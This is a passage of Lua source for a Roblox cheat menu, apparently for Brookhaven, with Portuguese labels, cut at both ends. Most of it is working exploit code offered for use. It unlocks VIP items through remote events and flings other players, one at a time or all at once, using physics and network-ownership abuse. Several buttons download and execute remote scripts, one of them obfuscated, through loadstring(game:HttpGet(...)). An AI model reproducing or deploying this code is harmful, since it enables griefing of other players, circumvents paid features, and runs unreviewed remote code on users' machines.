game:GetService("ReplicatedStorage").RE:FindFirstChild("1Clea1rTool1s"):FireServer(unpack(args))

    end
})

Tab:AddButton({
    Name = "Selecionar Escopo de Carro VIP",
    Callback = function()
        local args = {
    [1] = "RequestingPropName",
    [2] = "CarRaceScoopeVIP"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Clea1rTool1s"):FireServer(unpack(args))

    end
})

Tab:AddButton({
    Name = "Selecionar Assas de Carro VIP 1",
    Callback = function()
        local args = {
    [1] = "RequestingPropName",
    [2] = "CarFullColorVIP"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Clea1rTool1s"):FireServer(unpack(args))

    end
})

Tab:AddButton({
    Name = "Selecionar Assas de Carro VIP 2",
    Callback = function()
        local args = {
    [1] = "RequestingPropName",
    [2] = "CarWingHalfColorVIP"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Clea1rTool1s"):FireServer(unpack(args))
        
    end
})

Tab:AddButton({
    Name = "Selecionar Luzes de Carro VIP",
    Callback = function()
        local args = {
    [1] = "RequestingPropName",
    [2] = "CarTruckLightsOrange"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Clea1rTool1s"):FireServer(unpack(args))

    end
})

Tab:AddButton({
    Name = "Selecionar Mini Gun VIP",
    Callback = function()
        local args = {
    [1] = "RequestingPropName",
    [2] = "MilitaryMiniGunVIP"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Clea1rTool1s"):FireServer(unpack(args))

    end
})

Tab:AddButton({
    Name = "Selecionar Mini Gun Para Carro VIP",
    Callback = function()
        local args = {
    [1] = "RequestingPropName",
    [2] = "MilitaryCarMiniGunVIP"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Clea1rTool1s"):FireServer(unpack(args))

    end
})

Tab:AddButton({
    Name = "Selecionar Balão de Pum VIP",
    Callback = function()
        local args = {
    [1] = "RequestingPropName",
    [2] = "ToolsFart"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Clea1rTool1s"):FireServer(unpack(args))
    end
})


local Tab = Window:MakeTab({
	Name = "Join Id",
	Icon = "rbxassetid://10734898355",
	PremiumOnly = false
})


-- Variável para armazenar o ID do servidor
local ServerID = ""

-- Adicionar um botão para copiar o ID do servidor atual
Tab:AddButton({
    Name = "Copiar ID do Servidor",
    Callback = function()
        setclipboard(game.JobId) -- Copia o ID do servidor para a área de transferência
        OrionLib:MakeNotification({
            Name = "Copiado!",
            Content = "O ID do servidor foi copiado!",
            Image = "rbxassetid://4483345998",
            Time = 3
        })
    end
})

-- Adicionar um input para inserir o ID do servidor desejado
Tab:AddTextbox({
    Name = "ID do Servidor",
    Default = "",
    TextDisappear = false,
    Callback = function(Value)
        ServerID = Value
    end
})

-- Adicionar um botão para entrar no servidor desejado
Tab:AddButton({
    Name = "Entrar no Servidor",
    Callback = function()
        local TeleportService = game:GetService("TeleportService")
        local PlaceID = game.PlaceId -- Obtém o ID do jogo atual

        if ServerID ~= "" then
            TeleportService:TeleportToPlaceInstance(PlaceID, ServerID, game.Players.LocalPlayer)
        else
            OrionLib:MakeNotification({
                Name = "Erro",
                Content = "Insira um ID válido!",
                Image = "rbxassetid://4483345998",
                Time = 3
            })
        end
    end
})


local Tab = Window:MakeTab({
	Name = "Troll Version",
	Icon = "rbxassetid://10734898355",
	PremiumOnly = false
})


Tab:AddButton({
	Name = "troll Version",
	Callback = function()
      		local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- Lista de usuários autorizados
local authorizedUsers = {
    ["AdmBrookhaven4"] = true,
    ["sr_greg81"] = true,
    ["TwT_perdiminhaconta"] = true,
    ["scarys_cary66666"] = true,
    ["AdmBrookhaven5"] = true,
    ["kdjdhwie12"] = true,
    ["admbughaven4"] = true,
    ["Pguel_01"] = true,
    ["fazolpguel2"] = true,
    ["kdjdhwie14"] = true,
    ["kdjdhwie13"] = true,
    ["TemplariosHub"] = true,
    ["j3ffwoods"] = true,
    ["Ink_sannes13"] = true,
    ["juninho126501"] = true,
    ["baconbadass6"] = true,
    ["Johnatan_FF95"] = true,
    ["Nego_Doce144"] = true,
    ["joaoantonio1997"] = true,
    ["contadefarme12"] = true,
    ["sr_greg26"] = true,
    ["sirtjfoxy123"] = true,
    ["samuel123456game1"] = true,
    ["thekjahwn"] = true,
    ["bypassadonis"] = true,
    ["PerfFectBx4483"] = true,
    ["breno628e5"] = true,
    ["kdjdhwie"] = true,
    ["SCARYS_CARY66666"] = true,
    ["davigemes300617"] = true,
    ["ERROR887282"] = true,
    ["Meliodas1234328"] = true,
    ["ajudante_Claudio"] = true,
    ["hdqnwsn"] = true,
    ["thek01890"] = true,
    ["mano_shark6"] = true,
    ["volvinhr"] = true,
    ["KAIO_XTY"] = true,
    ["djekejsn"] = true,
    ["D99SHOP"] = true,
    ["cotryball8"] = true,
    ["ADMBROOKHAVEN6676"] = true,
    ["cuidado_025"] = true,
    ["PerfFectBx4483"] = true,
    ["Mateuszinban"] = true,
    ["nolyhaha"] = true,
    ["mTADORDEWEB666"] = true,
    ["contasecundariamrred"] = true,
    ["novacontapolicebrook"] = true,
    ["Nego_doce144"] = true,
    ["amandabrfofinhagam2"] = true,
}

-- Caso o jogador não seja autorizado, ele será kickado
if not authorizedUsers[LocalPlayer.Name] then
    LocalPlayer:Kick("❌️ Você não tem Permissão para Executar esse Script, fale com o criador dele para que ele libere seu acesso.")
    return
end


local OrionLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/kiwi541/Libray-do-PB/refs/heads/main/README.md"))()
local Window = OrionLib:MakeWindow({Name = "P.B Hub Troll V8", HidePremium = false, SaveConfig = true, ConfigFolder = "PBTrollV8", IntroText = "P.B Hub Troll V8.1", IntroIcon = "rbxassetid://132225387260946"})

local playerName = game.Players.LocalPlayer.Name

OrionLib:MakeNotification({
    Name = "Bem-vindo(a)!",
    Content = "Olá " .. playerName,
    Image = "rbxassetid://132225387260946",
    Time = 5
})


local Tab = Window:MakeTab({
	Name = "Fling/Car",
	Icon = "rbxassetid://82030382489670",
	PremiumOnly = false
})


local Section = Tab:AddSection({
	Name = "Fling"
})

local Targets = {""} -- Nome será preenchido pela TextBox
local LoopAtivo = false

-- TextBox para capturar o nome do jogador e armazenar em Targets[1]
Tab:AddTextbox({
    Name = "Digite o nome do Jogador",
    Default = "",
    TextDisappear = true,
    Callback = function(Value)
        Targets[1] = Value
    end
})

-- Botão com a função completa no Callback e loop infinito usando RunService
Tab:AddToggle({
	Name = "Fling",
	Default = false,
	Callback = function(Value)
		if Value then
            -- Ativa o loop quando a toggle é ligada
            LoopAtivo = true
            task.spawn(function()
                while LoopAtivo do
                    local player = game.Players.LocalPlayer
 local mouse = player:GetMouse()
 local Targets = {Targets[1]}
 
 local Players = game:GetService("Players")
 local Player = Players.LocalPlayer
 
 local AllBool = false
 
 local GetPlayer = function(Name)
	Name = Name:lower()
	if Name == "all" or Name == "others" then
		AllBool = true
		return
	elseif Name == "random" then
		local GetPlayers = Players:GetPlayers()
		if table.find(GetPlayers,Player) then table.remove(GetPlayers,table.find(GetPlayers,Player)) end
		return GetPlayers[math.random(#GetPlayers)]
	elseif Name ~= "random" and Name ~= "all" and Name ~= "others" then
		for _,x in next, Players:GetPlayers() do
			if x ~= Player then
				if x.Name:lower():match("^"..Name) then
					return x;
				elseif x.DisplayName:lower():match("^"..Name) then
					return x;
				end
			end
		end
	else
		return
	end
 end
 
 local Message = function(_Title, _Text, Time)
	print(_Title)
	print(_Text)
	print(Time)
end

local SkidFling = function(TargetPlayer)
	local Character = Player.Character
	local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
	local RootPart = Humanoid and Humanoid.RootPart
 
	local TCharacter = TargetPlayer.Character
	local THumanoid
	local TRootPart
	local THead
	local Accessory
	local Handle
 
	if TCharacter:FindFirstChildOfClass("Humanoid") then
		THumanoid = TCharacter:FindFirstChildOfClass("Humanoid")
	end
	if THumanoid and THumanoid.RootPart then
		TRootPart = THumanoid.RootPart
	end
	if TCharacter:FindFirstChild("Head") then
		THead = TCharacter.Head
	end
	if TCharacter:FindFirstChildOfClass("Accessory") then
		Accessory = TCharacter:FindFirstChildOfClass("Accessory")
	end
	if Accessoy and Accessory:FindFirstChild("Handle") then
		Handle = Accessory.Handle
	end
 
	if Character and Humanoid and RootPart then
		if RootPart.Velocity.Magnitude < 50 then
			getgenv().OldPos = RootPart.CFrame
		end
		if THumanoid and THumanoid.Sit and not AllBool then
		end
		if THead then
			workspace.CurrentCamera.CameraSubject = THead
		elseif not THead and Handle then
			workspace.CurrentCamera.CameraSubject = Handle
		elseif THumanoid and TRootPart then
			workspace.CurrentCamera.CameraSubject = THumanoid
		end
		if not TCharacter:FindFirstChildWhichIsA("BasePart") then
			return
		end
		
		local FPos = function(BasePart, Pos, Ang)
			RootPart.CFrame = CFrame.new(BasePart.Position) * Pos * Ang
			Character:SetPrimaryPartCFrame(CFrame.new(BasePart.Position) * Pos * Ang)
			RootPart.Velocity = Vector3.new(9e7, 9e7 * 10, 9e7)
			RootPart.RotVelocity = Vector3.new(9e8, 9e8, 9e8)
		end
		
		local SFBasePart = function(BasePart)
			local TimeToWait = 2
			local Time = tick()
			local Angle = 0
 
			repeat
				if RootPart and THumanoid then
					if BasePart.Velocity.Magnitude < 50 then
						Angle = Angle + 100
 
						FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle),0 ,0))
						task.wait()
 
						FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
						task.wait()
 
						FPos(BasePart, CFrame.new(2.25, 1.5, -2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
						task.wait()
 
						FPos(BasePart, CFrame.new(-2.25, -1.5, 2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
						task.wait()
 
						FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection,CFrame.Angles(math.rad(Angle), 0, 0))
						task.wait()
 
						FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection,CFrame.Angles(math.rad(Angle), 0, 0))
						task.wait()
					else
						FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
						task.wait()
 
						FPos(BasePart, CFrame.new(0, -1.5, -THumanoid.WalkSpeed), CFrame.Angles(0, 0, 0))
						task.wait()
 
						FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
						task.wait()
						
						FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
						task.wait()
 
						FPos(BasePart, CFrame.new(0, -1.5, -TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(0, 0, 0))
						task.wait()
 
						FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
						task.wait()
 
						FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(90), 0, 0))
						task.wait()
 
						FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
						task.wait()
 
						FPos(BasePart, CFrame.new(0, -1.5 ,0), CFrame.Angles(math.rad(-90), 0, 0))
						task.wait()
 
						FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
						task.wait()
					end
				else
					break
				end
			until BasePart.Velocity.Magnitude > 500 or BasePart.Parent ~= TargetPlayer.Character or TargetPlayer.Parent ~= Players or not TargetPlayer.Character == TCharacter or THumanoid.Sit or Humanoid.Health <= 0 or tick() > Time + TimeToWait
		end
		
		workspace.FallenPartsDestroyHeight = 0/0
		
		local BV = Instance.new("BodyVelocity")
		BV.Name = "EpixVel"
		BV.Parent = RootPart
		BV.Velocity = Vector3.new(9e8, 9e8, 9e8)
		BV.MaxForce = Vector3.new(1/0, 1/0, 1/0)
		
		Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
		
		if TRootPart and THead then
			if (TRootPart.CFrame.p - THead.CFrame.p).Magnitude > 5 then
				SFBasePart(THead)
			else
				SFBasePart(TRootPart)
			end
		elseif TRootPart and not THead then
			SFBasePart(TRootPart)
		elseif not TRootPart and THead then
			SFBasePart(THead)
		elseif not TRootPart and not THead and Accessory and Handle then
			SFBasePart(Handle)
		else
		end
		
		BV:Destroy()
		Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
		workspace.CurrentCamera.CameraSubject = Humanoid
	
		workspace.FallenPartsDestroyHeight = getgenv().FPDH
	else
	end
 end
 
 getgenv().Welcome = true
 if Targets[1] then for _,x in next, Targets do GetPlayer(x) end else return end
 
 if AllBool then
	for _,x in next, Players:GetPlayers() do
		SkidFling(x)
	end
 end
 
 for _,x in next, Targets do
	if GetPlayer(x) and GetPlayer(x) ~= Player then
		if GetPlayer(x).UserId ~= 1414978355 then
			local TPlayer = GetPlayer(x)
			if TPlayer then
				SkidFling(TPlayer)
			end
		else
		end
	elseif not GetPlayer(x) and not AllBool then
	end
 end
                    task.wait(0.1)
                end
            end)
        else
            -- Desativa o loop quando a toggle é desligada
            LoopAtivo = false
        end
	end    
})

Tab:AddButton({
	Name = "Pegar Sofá",
	Callback = function()
local args = {
    [1] = "PickingTools",
    [2] = "Couch"
}

game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l"):InvokeServer(unpack(args))
  	end    
})

Tab:AddButton({
	Name = "Super Fling All",
	Callback = function()
      		local player = game.Players.LocalPlayer
 local mouse = player:GetMouse()
 local Targets = {"all"}
 
 local Players = game:GetService("Players")
 local Player = Players.LocalPlayer
 
 local AllBool = false
 
 local GetPlayer = function(Name)
	Name = Name:lower()
	if Name == "all" or Name == "others" then
		AllBool = true
		return
	elseif Name == "random" then
		local GetPlayers = Players:GetPlayers()
		if table.find(GetPlayers,Player) then table.remove(GetPlayers,table.find(GetPlayers,Player)) end
		return GetPlayers[math.random(#GetPlayers)]
	elseif Name ~= "random" and Name ~= "all" and Name ~= "others" then
		for _,x in next, Players:GetPlayers() do
			if x ~= Player then
				if x.Name:lower():match("^"..Name) then
					return x;
				elseif x.DisplayName:lower():match("^"..Name) then
					return x;
				end
			end
		end
	else
		return
	end
 end
 
 local Message = function(_Title, _Text, Time)
	print(_Title)
	print(_Text)
	print(Time)
end
 
 local SkidFling = function(TargetPlayer)
	local Character = Player.Character
	local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
	local RootPart = Humanoid and Humanoid.RootPart
 
	local TCharacter = TargetPlayer.Character
	local THumanoid
	local TRootPart
	local THead
	local Accessory
	local Handle
 
	if TCharacter:FindFirstChildOfClass("Humanoid") then
		THumanoid = TCharacter:FindFirstChildOfClass("Humanoid")
	end
	if THumanoid and THumanoid.RootPart then
		TRootPart = THumanoid.RootPart
	end
	if TCharacter:FindFirstChild("Head") then
		THead = TCharacter.Head
	end
	if TCharacter:FindFirstChildOfClass("Accessory") then
		Accessory = TCharacter:FindFirstChildOfClass("Accessory")
	end
	if Accessoy and Accessory:FindFirstChild("Handle") then
		Handle = Accessory.Handle
	end
 
	if Character and Humanoid and RootPart then
		if RootPart.Velocity.Magnitude < 50 then
			getgenv().OldPos = RootPart.CFrame
		end
		if THumanoid and THumanoid.Sit and not AllBool then
		end
		if THead then
			workspace.CurrentCamera.CameraSubject = THead
		elseif not THead and Handle then
			workspace.CurrentCamera.CameraSubject = Handle
		elseif THumanoid and TRootPart then
			workspace.CurrentCamera.CameraSubject = THumanoid
		end
		if not TCharacter:FindFirstChildWhichIsA("BasePart") then
			return
		end
		
		local FPos = function(BasePart, Pos, Ang)
			RootPart.CFrame = CFrame.new(BasePart.Position) * Pos * Ang
			Character:SetPrimaryPartCFrame(CFrame.new(BasePart.Position) * Pos * Ang)
			RootPart.Velocity = Vector3.new(9e7, 9e7 * 10, 9e7)
			RootPart.RotVelocity = Vector3.new(9e8, 9e8, 9e8)
		end
		
		local SFBasePart = function(BasePart)
			local TimeToWait = 2
			local Time = tick()
			local Angle = 0
 
			repeat
				if RootPart and THumanoid then
					if BasePart.Velocity.Magnitude < 50 then
						Angle = Angle + 100
 
						FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle),0 ,0))
						task.wait()
 
						FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
						task.wait()
 
						FPos(BasePart, CFrame.new(2.25, 1.5, -2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
						task.wait()
 
						FPos(BasePart, CFrame.new(-2.25, -1.5, 2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
						task.wait()
 
						FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection,CFrame.Angles(math.rad(Angle), 0, 0))
						task.wait()
 
						FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection,CFrame.Angles(math.rad(Angle), 0, 0))
						task.wait()
					else
						FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
						task.wait()
 
						FPos(BasePart, CFrame.new(0, -1.5, -THumanoid.WalkSpeed), CFrame.Angles(0, 0, 0))
						task.wait()
 
						FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
						task.wait()
						
						FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
						task.wait()
 
						FPos(BasePart, CFrame.new(0, -1.5, -TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(0, 0, 0))
						task.wait()
 
						FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
						task.wait()
 
						FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(90), 0, 0))
						task.wait()
 
						FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
						task.wait()
 
						FPos(BasePart, CFrame.new(0, -1.5 ,0), CFrame.Angles(math.rad(-90), 0, 0))
						task.wait()
 
						FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
						task.wait()
					end
				else
					break
				end
			until BasePart.Velocity.Magnitude > 500 or BasePart.Parent ~= TargetPlayer.Character or TargetPlayer.Parent ~= Players or not TargetPlayer.Character == TCharacter or THumanoid.Sit or Humanoid.Health <= 0 or tick() > Time + TimeToWait
		end
		
		workspace.FallenPartsDestroyHeight = 0/0
		
		local BV = Instance.new("BodyVelocity")
		BV.Name = "EpixVel"
		BV.Parent = RootPart
		BV.Velocity = Vector3.new(9e8, 9e8, 9e8)
		BV.MaxForce = Vector3.new(1/0, 1/0, 1/0)
		
		Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
		
		if TRootPart and THead then
			if (TRootPart.CFrame.p - THead.CFrame.p).Magnitude > 5 then
				SFBasePart(THead)
			else
				SFBasePart(TRootPart)
			end
		elseif TRootPart and not THead then
			SFBasePart(TRootPart)
		elseif not TRootPart and THead then
			SFBasePart(THead)
		elseif not TRootPart and not THead and Accessory and Handle then
			SFBasePart(Handle)
		else
		end
		
		BV:Destroy()
		Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
		workspace.CurrentCamera.CameraSubject = Humanoid
		
		repeat
			RootPart.CFrame = getgenv().OldPos * CFrame.new(0, .5, 0)
			Character:SetPrimaryPartCFrame(getgenv().OldPos * CFrame.new(0, .5, 0))
			Humanoid:ChangeState("GettingUp")
			table.foreach(Character:GetChildren(), function(_, x)
				if x:IsA("BasePart") then
					x.Velocity, x.RotVelocity = Vector3.new(), Vector3.new()
				end
			end)
			task.wait()
		until (RootPart.Position - getgenv().OldPos.p).Magnitude < 25
		workspace.FallenPartsDestroyHeight = getgenv().FPDH
	else
	end
 end
 
 getgenv().Welcome = true
 if Targets[1] then for _,x in next, Targets do GetPlayer(x) end else return end
 
 if AllBool then
	for _,x in next, Players:GetPlayers() do
		SkidFling(x)
	end
 end
 
 for _,x in next, Targets do
	if GetPlayer(x) and GetPlayer(x) ~= Player then
		if GetPlayer(x).UserId ~= 1414978355 then
			local TPlayer = GetPlayer(x)
			if TPlayer then
				SkidFling(TPlayer)
			end
		else
		end
	elseif not GetPlayer(x) and not AllBool then
	end
 end
  	end    
})

local Section = Tab:AddSection({
	Name = "Fling no Jogador que Descer do Sofá"
})

Tab:AddButton({
	Name = "Fling no Jogador que Descer do Sofá",
	Callback = function()
      		loadstring(game:HttpGet(('https://raw.githubusercontent.com/0Ben1/fe/main/obf_5wpM7bBcOPspmX7lQ3m75SrYNWqxZ858ai3tJdEAId6jSI05IOUB224FQ0VSAswH.lua.txt'),true))()
  	end    
})

local Section = Tab:AddSection({
	Name = "Infinite Yield"
})

Tab:AddButton({
	Name = "Infinite Yield FE",
	Callback = function()
      		loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
  	end    
})


local Section = Tab:AddSection({
	Name = "Boat Fling"
})


local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local RunService = game:GetService("RunService")

local playerNames = {}
for _, player in pairs(Players:GetPlayers()) do
    table.insert(playerNames, player.Name)
end

local selectedPlayerName = nil

Tab:AddDropdown({
    Name = "Target",
    Options = playerNames,
    Callback = function(selected)
        selectedPlayerName = selected
    end
})

local function executeScript()
    local UserInputService = game:GetService("UserInputService")
    local Mouse = game.Players.LocalPlayer:GetMouse()
    local Folder = Instance.new("Folder", Workspace)
    local Part = Instance.new("Part", Folder)
    local Attachment1 = Instance.new("Attachment", Part)
    Part.Anchored = true
    Part.CanCollide = false
    Part.Transparency = 1

    local NetworkAccess = coroutine.create(function()
        settings().Physics.AllowSleep = false
        while RunService.RenderStepped:Wait() do
            for _, player in next, Players:GetPlayers() do
                if player ~= Players.LocalPlayer then
                    player.MaximumSimulationRadius = 0
                    sethiddenproperty(player, "SimulationRadius", 0)
                end
            end
            Players.LocalPlayer.MaximumSimulationRadius = math.pow(math.huge, math.huge)
            setsimulationradius(math.huge)
        end
    end)
    coroutine.resume(NetworkAccess)

    local function ForceVehicle(v)
        if v:IsA("Model") and v:FindFirstChildOfClass("VehicleSeat") then
            Mouse.TargetFilter = v
            for _, x in next, v:GetDescendants() do
                if x:IsA("BodyAngularVelocity") or x:IsA("BodyForce") or x:IsA("BodyGyro") or x:IsA("BodyPosition") or x:IsA("BodyThrust") or x:IsA("BodyVelocity") or x:IsA("RocketPropulsion") then
                    x:Destroy()
                end
            end
            if v:FindFirstChild("Attachment") then
                v:FindFirstChild("Attachment"):Destroy()
            end
            if v:FindFirstChild("AlignPosition") then
                v:FindFirstChild("AlignPosition"):Destroy()
            end
            if v:FindFirstChild("Torque") then
                v:FindFirstChild("Torque"):Destroy()
            end
            for _, part in next, v:GetDescendants() do
                if part:IsA("BasePart") then
                    part.CanCollide = false
                    local Torque = Instance.new("Torque", part)
                    Torque.Torque = Vector3.new(100000 * 12, 100000 * 12, 100000 * 12)
                    local AlignPosition = Instance.new("AlignPosition", part)
                    local Attachment2 = Instance.new("Attachment", part)
                    Torque.Attachment0 = Attachment2
                    AlignPosition.MaxForce = 999999
                    AlignPosition.MaxVelocity = math.huge
                    AlignPosition.Responsiveness = 200
                    AlignPosition.Attachment0 = Attachment2
                    AlignPosition.Attachment1 = Attachment1
                end
            end
        end
    end

    for _, v in next, Workspace:GetDescendants() do
        ForceVehicle(v)
    end

    Workspace.DescendantAdded:Connect(function(v)
        ForceVehicle(v)
    end)

    spawn(function()
        while true do
            local voidPosition = Vector3.new(101, -446, -180)
            Attachment1.WorldCFrame = CFrame.new(voidPosition)
            RunService.RenderStepped:Wait()
        end
    end)
end

local function monitorSeats()
    for _, seat in pairs(Workspace:GetDescendants()) do
        if seat:IsA("Seat") or seat:IsA("VehicleSeat") then
            seat:GetPropertyChangedSignal("Occupant"):Connect(function()
                if seat.Occupant then
                    local occupantPlayer = Players:GetPlayerFromCharacter(seat.Occupant.Parent)
                    if occupantPlayer and occupantPlayer.Name == selectedPlayerName then
                        executeScript()
                    end
                end
            end)
        end
    end

    Workspace.DescendantAdded:Connect(function(descendant)
        if descendant:IsA("Seat") or descendant:IsA("VehicleSeat") then
            descendant:GetPropertyChangedSignal("Occupant"):Connect(function()
                if descendant.Occupant then
                    local occupantPlayer = Players:GetPlayerFromCharacter(descendant.Occupant.Parent)
                    if occupantPlayer and occupantPlayer.Name == selectedPlayerName then
                        executeScript()
                    end
                end
            end)
        end
    end)
end

monitorSeats()
Tab:AddButton({
    Name = "Boat Fling",
    Callback = function()
        local Player = game.Players.LocalPlayer
        local Character = Player.Character or Player.CharacterAdded:Wait()
        local Humanoid = Character:FindFirstChildOfClass("Humanoid")
        local RootPart = Character:WaitForChild("HumanoidRootPart")
        local Vehicles = game.Workspace:FindFirstChild("Vehicles")
        local OldPos = RootPart.CFrame

        if not Humanoid or not Vehicles then return end

        local function GetCar()
            return Vehicles:FindFirstChild(Player.Name.."Car")
        end

        local PCar = GetCar()

        if not PCar then
            RootPart.CFrame = CFrame.new(-2, 5, 2085)
            task.wait(0.5)
            local RemoteEvent = game:GetService("ReplicatedStorage"):FindFirstChild("RE")
            if RemoteEvent and RemoteEvent:FindFirstChild("1Ca1r") then
                RemoteEvent["1Ca1r"]:FireServer("PickingBoat", "MilitaryBoatFree")
            end
            task.wait(1)
            PCar = GetCar()
        end

        if PCar then
            local Seat = PCar:FindFirstChild("Body") and PCar.Body:FindFirstChild("VehicleSeat")
            if Seat and not Humanoid.Sit then
                repeat
                    RootPart.CFrame = Seat.CFrame * CFrame.new(0, math.random(-1, 1), 0)
                    task.wait()
                until Humanoid.Sit or not PCar.Parent
            end
        end

        wait(0.2)

        local UserInputService = game:GetService("UserInputService")
        local RunService = game:GetService("RunService")
        local Mouse = Players.LocalPlayer:GetMouse()
        local Folder = Instance.new("Folder", game:GetService("Workspace"))
        local Part = Instance.new("Part", Folder)
        local Attachment1 = Instance.new("Attachment", Part)
        Part.Anchored = true
        Part.CanCollide = false
        Part.Transparency = 1

        local NetworkAccess = coroutine.create(function()
            settings().Physics.AllowSleep = false
            while RunService.RenderStepped:Wait() do
                for _, player in next, Players:GetPlayers() do
                    if player ~= Players.LocalPlayer then
                        player.MaximumSimulationRadius = 0
                        sethiddenproperty(player, "SimulationRadius", 2)
                    end
                end
                Players.LocalPlayer.MaximumSimulationRadius = math.pow(math.huge, math.huge)
                setsimulationradius(math.huge)
            end
        end)
        coroutine.resume(NetworkAccess)

        local function ForceVehicle(v)
            if v:IsA("Model") and v:FindFirstChildOfClass("VehicleSeat") then
                Mouse.TargetFilter = v
                for _, x in next, v:GetDescendants() do
                    if x:IsA("BodyAngularVelocity") or x:IsA("BodyForce") or x:IsA("BodyGyro") or x:IsA("BodyPosition") or x:IsA("BodyThrust") or x:IsA("BodyVelocity") or x:IsA("RocketPropulsion") then
                        x:Destroy()
                    end
                end
                if v:FindFirstChild("Attachment") then
                    v:FindFirstChild("Attachment"):Destroy()
                end
                if v:FindFirstChild("AlignPosition") then
                    v:FindFirstChild("AlignPosition"):Destroy()
                end
                if v:FindFirstChild("Torque") then
                    v:FindFirstChild("Torque"):Destroy()
                end
                for _, part in next, v:GetDescendants() do
                    if part:IsA("BasePart") then
                        part.CanCollide = false
                        local Torque = Instance.new("Torque", part)
                        Torque.Torque = Vector3.new(1000 * 102, 100000 * 102, 10000 * 12)
                        local AlignPosition = Instance.new("AlignPosition", part)
                        local Attachment2 = Instance.new("Attachment", part)
                        Torque.Attachment0 = Attachment2
                        AlignPosition.MaxForce = 99999
                        AlignPosition.MaxVelocity = math.huge
                        AlignPosition.Responsiveness = 200
                        AlignPosition.Attachment0 = Attachment2
                        AlignPosition.Attachment1 = Attachment1
                    end
                end
            end
        end

        for _, v in next, game:GetService("Workspace"):GetDescendants() do
            ForceVehicle(v)
        end

        game:GetService("Workspace").DescendantAdded:Connect(function(v)
            ForceVehicle(v)
        end)

        spawn(function()
            while true do
                if selectedPlayerName then
                    local player = Players:FindFirstChild(selectedPlayerName)
                    if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                        local rootPart = player.Character.HumanoidRootPart
                        Attachment1.WorldCFrame = rootPart.CFrame
                    end
                end
                RunService.RenderStepped:Wait()
            end
        end)

        wait(4)

        local targetPosition = Vector3.new(101, -446, -180)
        player.Character.HumanoidRootPart.CFrame = CFrame.new(targetPosition)

        -- Código adicionado para efeito do kill()
        local function applyKillEffect(targetPlayer)
            if targetPlayer and targetPlayer.Character then
                local TargetRP = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
                local TargetH = targetPlayer.Character:FindFirstChildOfClass("Humanoid")
                local Angles = 45

                if TargetRP and TargetH then
                    kill(TargetRP, CFrame.new(0, 3, 0) + TargetH.MoveDirection * TargetRP.Velocity.Magnitude / 1.05, CFrame.Angles(math.rad(Angles), 0, 0))
